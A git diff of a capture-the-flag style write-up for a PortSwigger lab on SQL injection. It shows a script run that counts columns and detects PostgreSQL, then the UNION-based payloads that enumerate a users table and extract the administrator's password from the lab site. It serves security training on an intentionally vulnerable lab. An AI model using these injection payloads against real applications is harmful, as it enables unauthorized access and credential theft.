@@ -69,28 +69,31 @@
 
 # Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
-1. Determining amount of columns:
+1. Determining amount of columns and type of DB:
 
     ``` bash
-    ┌──(hue1337㉿kali)-[~/…/GitHub/PortSwigger/SQL_Injection/Scripts]
-    └─$ python3 columns_amount.py --url https://0abd005504f664e280cc53bc001400b4.web-security-academy.net/ --param category --amount 5
-    https://0abd005504f664e280cc53bc001400b4.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
-    Status code: 500
-    Amount: 5
-    Tmp_val: 2
-
-    Status code: 500
-    Amount: 4
-    Tmp_val: 1
-
-    Status code: 500
-    Amount: 3
-    Tmp_val: 1
-
-    Status code: 200
-    Amount: 2
-    Tmp_val: 1
-
+    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
+    └─$ python3 columns_amount.py --url https://0a5e00b003f6855980da8aa50037006c.web-security-academy.net/ --param category --amount 4
+    https://0a5e00b003f6855980da8aa50037006c.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
     [+] Amount of columns: 2 
+    [+] Postgre 
                                 
     ```
+
+2. From the PostgreSQL Docs we find out how to list the tables:
+
+    ```sql
+    select * from information_schema.tables
+    ```
+
+3. We can see table `users_xljros`. We gonna extract the password using following payloads:
+
+    ```sql
+    ' union select column_name,null from information_schema.columns where table_name='users_xljros'-- -
+
+    ' union select password_wymahi, null from users_xljros where username_nbyctx='administrator'-- -
+    ```
+
+4. The password is: `gihs1spbm0jq86ghgc07`
+
+
